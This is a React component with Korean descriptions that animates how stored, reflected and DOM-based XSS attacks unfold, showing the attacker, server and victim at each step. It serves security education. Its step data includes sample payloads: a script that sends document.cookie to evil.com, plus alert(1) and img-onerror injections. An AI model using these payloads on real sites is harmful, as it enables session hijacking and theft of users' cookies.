"use client";

import { useState } from "react";
import { StepPlayer } from "../../primitives/StepPlayer";

type XssType = "stored" | "reflected" | "dom";

interface XssStep {
  attacker: string;
  server: string;
  victim: string;
  description: string;
}

const typeConfig: Record<XssType, { label: string }> = {
  stored: { label: "Stored XSS" },
  reflected: { label: "Reflected XSS" },
  dom: { label: "DOM-based XSS" },
};

const storedSteps: XssStep[] = [
  {
    attacker: "댓글 작성:\n<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
    server: "DB에 저장",
    victim: "",
    description: "공격자가 게시판에 악성 스크립트가 포함된 댓글을 작성합니다. 서버가 이를 그대로 데이터베이스에 저장합니다.",
  },
  {
    attacker: "",
    server: "DB에서 댓글 조회 →\nHTML에 포함하여 응답",
    victim: "게시글 페이지 방문",
    description: "피해자가 해당 게시글을 방문합니다. 서버가 DB에서 댓글을 가져와 HTML에 그대로 삽입합니다.",
  },
  {
    attacker: "쿠키 수신 완료\n→ 세션 탈취",
    server: "",
    victim: "브라우저가 <script> 실행\n→ 쿠키가 evil.com으로 전송됨",
    description: "브라우저가 HTML을 파싱하며 스크립트를 실행합니다. 피해자의 쿠키가 공격자 서버로 전송되어 세션이 탈취됩니다.",
  },
];

const reflectedSteps: XssStep[] = [
  {
    attacker: "악성 링크 전송:\nhttps://shop.com/search?q=<script>alert(1)</script>",
    server: "",
    victim: "",
    description: "공격자가 피해자에게 악성 스크립트가 포함된 URL을 전송합니다 (이메일, 메시지 등).",
  },
  {
    attacker: "",
    server: "검색어를 HTML에 반영:\n\"<script>alert(1)</script>\"에 대한 검색 결과",
    victim: "링크 클릭\n→ 서버에 요청",
    description: "피해자가 링크를 클릭합니다. 서버가 쿼리 파라미터를 이스케이프 없이 HTML에 포함하여 응답합니다.",
  },
  {
    attacker: "",
    server: "",
    victim: "브라우저가 <script> 실행\n→ 공격 코드 동작",
    description: "서버 응답의 HTML에 포함된 스크립트가 실행됩니다. Stored와 달리 DB에 저장되지 않고 URL을 통해 일회성으로 동작합니다.",
  },
];

const domSteps: XssStep[] = [
  {
    attacker: "악성 URL 전송:\nhttps://app.com/#<img onerror=alert(1) src=x>",
    server: "",
    victim: "",
    description: "공격자가 URL의 fragment(#)에 악성 코드를 넣어 전송합니다. fragment는 서버로 전송되지 않습니다.",
  },
  {
    attacker: "",
    server: "(요청을 받지 않음)\nfragment는 서버에 도달하지 않음",
    victim: "링크 클릭\n→ 페이지 로드",
    description: "피해자가 링크를 클릭합니다. 서버는 정상 HTML을 응답합니다 — 서버 측에서는 공격을 감지할 수 없습니다.",
  },
  {
    attacker: "",
    server: "",
    victim: "JavaScript가 location.hash를 읽어\ninnerHTML에 삽입\n→ 스크립트 실행",
    description: "클라이언트 JavaScript가 URL fragment를 읽어 DOM에 삽입합니다. 서버를 거치지 않고 브라우저에서만 발생하는 XSS입니다.",
  },
];

const allSteps: Record<XssType, XssStep[]> = { stored: storedSteps, reflected: reflectedSteps, dom: domSteps };

export function XssAttackFlow() {
  const [type, setType] = useState<XssType>("stored");
  const data = allSteps[type];

  const stepNodes = data.map((step, idx) => (
    <div key={idx} className="space-y-3">
      <div className="flex gap-3 max-sm:flex-col">
        {step.attacker && (
          <div className="flex-1 min-w-0">
            <span className="mb-1 block text-[0.6875rem] uppercase tracking-wider text-muted">공격자</span>
            <pre className="bg-rose-50 dark:bg-rose-950/40 border border-rose-200 dark:border-rose-800 p-2.5 font-mono text-[0.5625rem] leading-relaxed text-text overflow-x-auto whitespace-pre">
              {step.attacker}
            </pre>
          </div>
        )}
        {step.server && (
          <div className="flex-1 min-w-0">
            <span className="mb-1 block text-[0.6875rem] uppercase tracking-wider text-muted">서버</span>
            <pre className="bg-stone-100 dark:bg-stone-800/40 border border-stone-200 dark:border-stone-700 p-2.5 font-mono text-[0.5625rem] leading-relaxed text-text overflow-x-auto whitespace-pre">
              {step.server}
            </pre>
          </div>
        )}
        {step.victim && (
          <div className="flex-1 min-w-0">
            <span className="mb-1 block text-[0.6875rem] uppercase tracking-wider text-muted">피해자</span>
            <pre className="bg-sky-50 dark:bg-sky-950/40 border border-sky-200 dark:border-sky-800 p-2.5 font-mono text-[0.5625rem] leading-relaxed text-text overflow-x-auto whitespace-pre">
              {step.victim}
            </pre>
          </div>
        )}
      </div>
      <div className="border-t border-border pt-3 text-[0.8125rem] leading-relaxed text-muted">
        {step.description}
      </div>
    </div>
  ));

  return (
    <div className="my-8 space-y-0">
      <div className="flex border-b border-border">
        {(["stored", "reflected", "dom"] as const).map((key) => (
          <button
            key={key}
            onClick={() => setType(key)}
            className={`px-4 py-2 text-[0.75rem] font-mono transition-colors border-b-2 -mb-px ${
              type === key ? "border-accent text-accent" : "border-transparent text-muted hover:text-text"
            }`}
          >
            {typeConfig[key].label}
          </button>
        ))}
      </div>
      <StepPlayer steps={stepNodes} />
    </div>
  );
}
